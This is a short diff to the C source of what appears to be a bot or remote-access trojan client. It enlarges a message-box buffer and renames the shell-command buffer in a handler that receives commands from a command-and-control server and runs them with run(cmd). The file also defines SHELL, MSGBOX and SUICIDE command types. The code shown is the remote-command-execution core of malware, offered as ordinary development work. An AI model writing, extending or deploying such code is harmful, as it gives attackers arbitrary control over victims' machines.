@@ -7,14 +7,14 @@
 #include "shell.h"
 
 #define CMDTYPE_BUFSIZE 1
-#define MSGBOX_BUFSIZE 128
-#define SHELL_BUFSIZE 4096
+#define MSGBOX_BUFSIZE 1024
+#define SHELL_CMD_BUFSIZE 4096
 
 enum cmd_types { SHELL, MSGBOX, SUICIDE };
 
 void handle_shell() {
   char *cmd, *out;
-  cmd = recv_from_cnc(SHELL_BUFSIZE);
+  cmd = recv_from_cnc(SHELL_CMD_BUFSIZE);
   printf("Executing shell command: %s\n", cmd);
   out = run(cmd);
   free(cmd);
